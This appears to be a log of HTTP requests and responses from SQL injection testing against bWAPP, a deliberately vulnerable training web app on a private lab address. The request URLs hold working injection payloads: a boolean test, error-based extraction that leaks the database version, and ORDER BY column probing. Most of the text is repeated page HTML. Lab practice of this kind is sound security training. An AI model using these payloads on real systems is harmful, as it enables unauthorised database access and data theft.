+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;30&quot;&gt;
+
+            &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;No movies were found!&lt;/td&gt;
+            &lt;!--
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            --&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt;
+            &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt;
+
+        &lt;/select&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form_security_level&quot; value=&quot;submit&quot;&gt;Set&lt;/button&gt;
+        &lt;font size=&quot;4&quot;&gt;Current: &lt;b&gt;low&lt;/b&gt;&lt;/font&gt;
+
+    &lt;/form&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bug&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Choose your bug:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;bug&quot;&gt;
+
+&lt;o</pre></details><details><summary>Transcript r10: GET http://192.168.223.221:8080/sqli_1.php?title=1+OR+1%3D2&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;30&quot;&gt;
+
+            &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;No movies were found!&lt;/td&gt;
+            &lt;!--
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            --&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt;
+            &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt;
+
+        &lt;/select&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form_security_level&quot; value=&quot;submit&quot;&gt;Set&lt;/button&gt;
+        &lt;font size=&quot;4&quot;&gt;Current: &lt;b&gt;low&lt;/b&gt;&lt;/font&gt;
+
+    &lt;/form&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bug&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Choose your bug:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;bug&quot;&gt;
+
+&lt;o</pre></details><details><summary>Transcript r11: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+AND+extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--+-&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;50&quot;&gt;
+
+            &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;Error: XPATH syntax error: &#x27;~5.5.47-0ubuntu0.14.04.1&#x27;</pre></details><details><summary>Transcript r12: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+1--+-&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;30&quot;&gt;
+
+            &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;No movies were found!&lt;/td&gt;
+            &lt;!--
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            --&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt;
+            &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt;
+
+        &lt;/select&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form_security_level&quot; value=&quot;submit&quot;&gt;Set&lt;/button&gt;
+        &lt;font size=&quot;4&quot;&gt;Current: &lt;b&gt;low&lt;/b&gt;&lt;/font&gt;
+
+    &lt;/form&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bug&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Choose your bug:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;bug&quot;&gt;
+
+&lt;o</pre></details><details><summary>Transcript r13: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+2--+-&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
